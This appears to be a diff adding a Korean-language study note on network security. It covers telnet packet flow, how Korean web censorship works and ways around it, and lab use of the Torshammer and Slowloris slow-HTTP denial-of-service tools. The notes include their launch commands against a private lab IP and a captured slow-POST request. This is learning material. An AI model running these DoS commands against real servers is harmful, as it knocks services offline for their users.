@@ -1,0 +1,76 @@
+telnet (기본과 구조가 좀 다르다)
+- 패킷의 방향이 좀 다르다.
+- 3wayhandshake방식
+- 단어 하나가 들어갈때마다 
+C->S PSH/ACK
+S->C ACK
+S->C PSH/ACK
+C->S ACK
+
+클라가 한번 보내면 응답값을 서버가 한번 더 보낸다
+최종 끝난게 클라에서 서버쪽으로 가는 것
+seq번호 잡기가 힘들었을 것이다.
+
+왜 알아야 하는가?
+- 솔루션을 운영하는데 있어서 필요한 부분이다.
+- 
+
+과거 검열
+1. ip차단(극단적인 상황에서만 쓴다. 함부로 할 수 있는 경우가 아니다. 하나의 사이트 막기위해 그 아이피를 벤하면 나머지 사이트도 피해본다.)
+2. DNS 국내서버(블랙리스트에 등록된 사이트를 들어가면 warning.or.kr)
+우회? 해외 DNS를 사용하면 우회 가능하다.
+3. HTTP안에 있는 KEY갑중 HOST에 도메인이 찍힌다. 이 도메인을 보고 블랙리스트로 걸러 warning.or.kr로 보낸다.
+우회 가능 -> tls를 사용하면 된다. https 이렇게 쓰면 안에 있는 호스트 도메인을 볼 수 없다.
+4. https 검열(클라가 hello라고 메시지를 보내면 메시지안에 SNI라는 필드 값이 있다. 이 필드 값에 호스트 이름이 박혀있다. 이 호스트를 보고 모니터링하고 있다가 연결을 끊어버린다.)
+우회 가능 -> VPN사용. 사이트 운영자의 경우 TLS 1.3사용하면 가능. SNI가 암호화 되어있어서 HOST를 볼 수 없다.
+
+----------------------------------------------------------------------------------------------------------
+RPS 공격
+
+
+-----------------------------------------------------------------------
+Torshammer 공격
+
+python torshammer.py -t 192.168.0.171 -r 256 공격 명령어
+
+SYN/ACK를 하나 누르고 follow TCP Stream 누르면
+POST / HTTP/1.1
+Host: 192.168.0.171
+User-Agent: Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
+Connection: keep-alive
+Keep-Alive: 900
+Content-Length: 10000
+Content-Type: application/x-www-form-urlencoded
+
+8zhiAUi3rPXLHogBJzVZn4F
+
+vi torshammer.py
+
+clss httpPost부터 제대로 Thread를 가지고
+self.socks.send에서
+Content-Length: 10000
+
+----------------------------------------------------------------------
+slowloris
+
+python slowloris.py 192.168.0.171 -p 80 -s 10000
+
+0d 0a는 엔터키랑 맞먹는다.
+0d 0a가 하나 더 붙으면 종료되는 것을 의미
+정상적인 패킷은 0d 0a 0d 0a가 되어야 한다.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
